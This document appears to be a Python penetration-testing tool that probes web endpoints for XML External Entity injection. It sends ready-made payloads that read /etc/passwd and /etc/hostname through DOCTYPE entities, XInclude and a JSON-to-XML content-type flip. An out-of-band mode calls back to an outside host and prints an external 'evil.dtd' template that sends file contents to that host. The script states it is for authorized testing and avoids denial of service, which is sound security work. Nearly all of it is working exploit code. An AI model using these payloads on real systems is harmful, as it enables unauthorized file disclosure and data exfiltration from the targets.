#!/usr/bin/env python3
"""xxe_probe.py — owned XXE / XML-injection DETECTION for pen_test.

Sends benign, single-level external-entity payloads through the shared _httpcore
engine and confirms real entity resolution — never reflection, never DoS:

  * in-band       — <!ENTITY xxe SYSTEM "file:///etc/passwd"> reflected; success =
                    the file's signature (`root:.*:0:0:`) appears where a static
                    canary would have, so it's expansion, not echo.
  * controls      — a canary-entity and an inert internal DOCTYPE first prove the
                    parser processes entities at all (modern parsers disable them;
                    that's a true negative, not a bug).
  * XInclude      — for when DOCTYPE is stripped but a value is parsed as XML.
  * JSON->XML flip— re-send a JSON request as application/xml to hit a dormant
                    XML parser the app never meant to expose (high-yield, 2024+).
  * blind/OOB     — with --oob-host, prints the exact external-DTD exfil skeleton
                    and fires a low-noise callback entity; a listener hit is proof.

NO billion-laughs / recursive expansion (that is DoS, out of scope). XXE->SSRF
and RCE-via-wrapper are referenced only — see ssrf_and_injection.md / rce.md.

AUTHORIZATION: active traffic — authorized targets only.

Usage:
    python3 xxe_probe.py -u "https://app/api/stock" -X POST            # whole-body
    python3 xxe_probe.py -u "https://app/api/stock" --xml-file req.xml # field-inject
    python3 xxe_probe.py -u "https://app/api/user" --json-flip '{"id":"1"}'
    python3 xxe_probe.py -u "https://app/api" --oob-host abc.oob.example --evidence-dir ./ev
"""

from __future__ import annotations

import argparse
import re

import _httpcore as core

PASSWD_RE = re.compile(r"root:.*:0:0:")
HOST_RE = re.compile(r"^[a-zA-Z0-9][\w.-]{0,62}$", re.M)
CANARY = "XXECANARY7731"

WHOLE_BODY = {
    "passwd": ('<?xml version="1.0"?>\n<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n'
               '<r>&xxe;</r>', PASSWD_RE),
    "hostname": ('<?xml version="1.0"?>\n<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>\n'
                 '<r>&xxe;</r>', HOST_RE),
}
CANARY_BODY = f'<?xml version="1.0"?>\n<!DOCTYPE r [ <!ENTITY x "{CANARY}"> ]>\n<r>&x;</r>'
XINCLUDE = ('<?xml version="1.0"?>\n<r xmlns:xi="http://www.w3.org/2001/XInclude">'
            '<xi:include parse="text" href="file:///etc/passwd"/></r>')
XML_CT = {"Content-Type": "application/xml"}


def _post(client, url, body, method="POST", ct=None):
    return client.request(method, url, data=body.encode("utf-8"),
                          headers=ct or XML_CT, allow_redirects=True)


def _excerpt(text, rx):
    m = rx.search(text)
    if not m:
        return text[:200]
    return text[max(0, m.start() - 20):m.start() + 200].replace("\n", " ")


def check_parser(client, url, method) -> bool:
    """Does the endpoint resolve DOCTYPE entities at all? (inert canary)"""
    r = _post(client, url, CANARY_BODY, method)
    resolved = r.ok and CANARY in r.text
    print(f"[control] inert internal entity {'RESOLVED' if resolved else 'not resolved'} "
          f"({r.status},{r.length}) — {'parser expands entities, proceed' if resolved else 'parser likely hardened (modern default); in-band unlikely'}")
    return resolved


def inband(client, url, method) -> tuple[str, str, str] | None:
    print("\n[in-band] external-entity file read (benign system files)...")
    for label, (body, rx) in WHOLE_BODY.items():
        r = _post(client, url, body, method)
        if not r.ok:
            continue
        # rule out reflection: the file signature, not our canary, must appear
        hit = bool(rx.search(r.text))
        print(f"  file:///etc/{label:9s} -> {'LEAK' if hit else 'no match'} ({r.status},{r.length})")
        if hit:
            return label, body, _excerpt(r.text, rx)
    # XInclude fallback (DOCTYPE-blocked case)
    r = _post(client, url, XINCLUDE, method)
    if r.ok and PASSWD_RE.search(r.text):
        print("  [!] XInclude file read succeeded (DOCTYPE-independent)")
        return "xinclude-passwd", XINCLUDE, _excerpt(r.text, PASSWD_RE)
    return None


def json_flip(client, url, json_body, method) -> tuple[str, str, str] | None:
    import json as jsonlib
    try:
        obj = jsonlib.loads(json_body)
    except Exception:
        print("  [json-flip] --json-flip value is not valid JSON, skipping")
        return None
    fields = "".join(f"<{k}>&xxe;</{k}>" if i == 0 else f"<{k}>{v}</{k}>"
                     for i, (k, v) in enumerate(obj.items()))
    body = ('<?xml version="1.0"?>\n<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n'
            f'<root>{fields}</root>')
    print("\n[json->xml flip] re-sending the JSON request as application/xml...")
    for ct in ({"Content-Type": "application/xml"}, {"Content-Type": "text/xml"}):
        r = _post(client, url, body, method, ct)
        hit = r.ok and PASSWD_RE.search(r.text)
        print(f"  {ct['Content-Type']:18s} -> {'LEAK' if hit else f'{r.status}'} ")
        if hit:
            return "json-flip-passwd", body, _excerpt(r.text, PASSWD_RE)
    return None


def oob(client, url, host, method) -> str:
    tok = CANARY.lower()
    body = ('<?xml version="1.0"?>\n<!DOCTYPE r [ <!ENTITY % xxe SYSTEM '
            f'"http://{tok}.{host}/canary"> %xxe; ]>\n<r>ping</r>')
    _post(client, url, body, method)
    dtd = (f'  Host this at http://{host}/evil.dtd for blind file exfil:\n'
           f'    <!ENTITY % file SYSTEM "file:///etc/hostname">\n'
           f'    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://{host}/?x=%file;\'>">\n'
           f'    %eval; %exfil;\n'
           f'  then send: <!DOCTYPE r [ <!ENTITY % x SYSTEM "http://{host}/evil.dtd"> %x; ]>')
    print(f"\n[oob] fired parameter-entity callback {tok}.{host} — check your listener.")
    print(dtd)
    return (f"OOB parameter-entity callback planted at {tok}.{host}; a hit on your listener "
            f"confirms blind XXE (external entity resolution). External-DTD exfil skeleton emitted.")


def main() -> None:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-u", "--url", required=True)
    p.add_argument("-X", "--method", default="POST")
    p.add_argument("--xml-file", help="a real XML request to field-inject (keeps app's structure)")
    p.add_argument("--json-flip", metavar="JSON", help="a JSON body to re-send as XML (content-type flip)")
    p.add_argument("--oob-host", help="collaborator/interactsh base domain for blind XXE")
    core.add_common_args(p)
    core.add_evidence_args(p)
    args = p.parse_args()
    core.require_scheme(args.url)

    client = core.client_from_args(args)
    ev = core.evidence_from_args(args)
    print(f"Target: {args.method} {args.url}")

    check_parser(client, args.url, args.method)

    result = inband(client, args.url, args.method)
    if not result and args.json_flip:
        result = json_flip(client, args.url, args.json_flip, args.method)
    oob_note = oob(client, args.url, args.oob_host, args.method) if args.oob_host else None

    print("\n" + "=" * 60)
    if not result and not oob_note:
        print("[-] No XXE signal. Modern parsers disable external entities by default — this may be "
              "a true negative. Try SVG/DOCX upload parsing, SAML, or the SSRF-via-entity angle.")
        return

    if result:
        label, body, excerpt = result
        proof = (f"external entity resolved: {label} — the target file's signature appeared in the "
                 f"response where a static canary would, proving entity expansion (not reflection).")
        print(f"[!] XXE CONFIRMED ({label}).")
    else:
        label, body, excerpt, proof = "blind-oob", "", "", oob_note
        print("[!] Blind XXE callback fired — confirm on your OOB listener.")
    print("    XXE->SSRF (metadata/internal) and RCE-via-wrapper are out of scope for this detector "
          "— see ssrf_and_injection.md / rce.md; not fired here.")

    if ev:
        repro = f"python3 xxe_probe.py -u '{args.url}' -X {args.method}" + \
                (f" --json-flip '{args.json_flip}'" if args.json_flip else "") + \
                (f" --oob-host {args.oob_host}" if args.oob_host else "")
        f = core.Finding(
            vuln_class="xxe", tool="xxe_probe.py",
            title=f"XML External Entity injection ({label})",
            severity="high", target=args.url,
            status="confirmed" if result else "candidate",
            proof=proof, request=f"{args.method} {args.url}  (application/xml body)",
            response_excerpt=excerpt, reproduce=repro,
            notes=(oob_note or "") + " Single-level benign entity only; no DoS. Escalation not fired.")
        ev.add(f)
        print(f"[evidence] finding written to {ev.findings_path}")


if __name__ == "__main__":
    main()
